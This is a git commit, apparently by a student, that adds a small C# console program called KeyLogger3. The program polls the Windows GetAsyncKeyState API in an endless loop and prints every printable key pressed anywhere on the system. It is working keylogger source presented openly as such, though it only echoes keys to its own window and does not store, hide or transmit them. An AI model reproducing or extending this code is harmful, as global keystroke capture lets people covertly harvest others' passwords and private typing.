870c1bbf3888c8527d8505b0f2b1ddf88aa8aac5
Student <student@abv.bg>
2024-02-07 12:26:44 +0200

    Added key logger!

---
+++ KeyLogger3/KeyLogger3/Program.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace KeyLogger3
+{
+    internal class Program
+    {
+        [DllImport("User32.dll")]
+
+        public static extern int GetAsyncKeyState(Int32 i);
+        
+        static string kelLog = "";
+        static void Main(string[] args)
+        {
+
+            while (true)
+            {
+                Thread.Sleep(5);
+
+                for (int i = 32; i < 127; i++)
+                {
+                    int keySate = GetAsyncKeyState(i);
+                    if (keySate == 32769)
+                    {
+                        Console.Write((char)i + ", ");
+                    }
+                }
+            }
+        }
+    }
+}
